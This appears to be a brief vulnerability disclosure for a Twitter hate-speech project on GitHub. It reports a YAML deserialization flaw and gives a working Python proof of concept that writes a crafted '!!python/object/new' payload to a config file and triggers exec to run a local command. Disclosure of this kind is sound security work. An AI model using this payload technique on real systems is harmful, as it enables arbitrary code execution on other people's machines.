# Description

`Hate speech` in Twitter , which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/pavelerokhin/hatespeech
```

### Run exploit.py
```
import os

#os.system('git clone https://github.com/pavelerokhin/hatespeech')
os.chdir('hatespeech/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""

open('cong.yml','w+').write(payload)
os.system('python3 main.py')

```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
